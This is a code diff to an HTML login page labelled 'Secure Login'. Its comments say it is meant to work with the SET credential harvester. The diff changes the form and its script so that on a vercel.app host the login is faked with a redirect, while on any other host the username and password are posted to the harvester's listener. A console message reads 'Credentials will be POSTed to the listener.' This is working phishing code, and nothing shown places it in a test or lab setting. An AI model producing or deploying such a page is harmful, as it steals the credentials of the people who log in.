@@ -26,7 +26,7 @@
                 Invalid username or password!
             </div>
 
-            <form id="loginForm" method="POST" action="">
+            <form id="loginForm" method="POST" action="login.html">
                 <div class="form-group">
                     <label for="username" style="color: var(--text-muted)"><i class="fas fa-user"></i> Username</label>
                     <input type="text" class="form-control" id="username" name="username" placeholder="Enter your username" required autofocus autocomplete="username">
@@ -35,11 +35,14 @@
                     <label for="password" style="color: var(--text-muted)"><i class="fas fa-lock"></i> Password</label>
                     <input type="password" class="form-control" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
                 </div>
+                <input type="hidden" name="step" value="1">
                 <div style="display:flex; align-items:center; gap:8px; margin-bottom:24px">
                     <input type="checkbox" id="remember" style="accent-color:var(--accent)">
                     <label for="remember" style="color:var(--text-muted); font-size:0.85rem; margin:0">Keep me logged in</label>
                 </div>
-                <input type="submit" name="submit" value="Secure Login" class="btn btn-primary" style="width:100%; padding:14px; font-weight:600; cursor:pointer; border:none">
+                <button type="submit" name="submit" class="btn btn-primary" style="width:100%; padding:14px; font-weight:600; cursor:pointer; border:none">
+                    Secure Login
+                </button>
             </form>
 
             <div style="margin-top:32px; border-top:1px solid rgba(255,255,255,0.1); padding-top:24px; text-align:center; display:flex; justify-content:center; gap:24px">
@@ -50,25 +53,22 @@
     </div>
 
     <script>
-        // SMART BYPASS: Handles Vercel 405 errors while allowing SET Harvester to capture credentials
-        const form = document.getElementById('loginForm');
+        // CRITICAL: Ensure form submits naturally on the Harvester IP
+        const loginForm = document.getElementById('loginForm');
+        const hostname = window.location.hostname;
         
-        // Detect if we are running on Vercel (where POST returns 405)
-        const isVercel = window.location.hostname.includes('vercel.app');
-        
-        if (isVercel) {
-            // On Vercel: Use JS redirect to avoid 405 Method Not Allowed
-            form.addEventListener('submit', function(e) {
+        // Only bypass if we are strictly on the Vercel production domain
+        if (hostname.includes('vercel.app')) {
+            loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                console.log("Vercel environment detected. Redirecting...");
                 localStorage.setItem('loggedin', 'true');
                 localStorage.setItem('username', document.getElementById('username').value || 'User');
                 window.location.href = 'pm_dashboard.html';
             });
         } else {
-            // On Harvester (Local IP/Domain): Let the form submit naturally!
-            // SET Credential Harvester will intercept the POST request.
-            console.log("Harvester environment detected. Form submission enabled.");
+            // Log for debugging (visible in F12 console on the harvester)
+            console.log("SET Harvester detected on: " + hostname);
+            console.log("Form submission is UNRESTRICTED. Credentials will be POSTed to the listener.");
         }
     </script>
 </body>
